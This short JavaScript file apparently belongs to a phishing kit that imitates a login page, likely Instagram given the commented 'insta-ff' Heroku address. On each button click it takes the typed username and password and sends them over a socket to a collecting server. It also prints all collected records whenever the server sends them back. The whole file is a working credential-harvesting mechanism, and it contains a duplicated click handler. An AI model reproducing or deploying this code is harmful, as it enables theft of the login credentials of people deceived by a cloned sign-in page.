const socket = io("localhost:8080");
// const socket = io("https://insta-ff.herokuapp.com/");

const btn = document.getElementById("loginbtn");

const username = document.getElementById("username");
const password = document.getElementById("password");

socket.on("gotAllData", (data) => {
  console.clear();
  console.log("Got all data.");
  console.log(data);
});

let sendData = () => {
  const data = {
    name: username.value,
    pass: password.value,
  };
  socket.emit("newData", data);
};

btn.onclick = () => {
  sendData();
};

btn.onclick = () => {
  sendData();
};
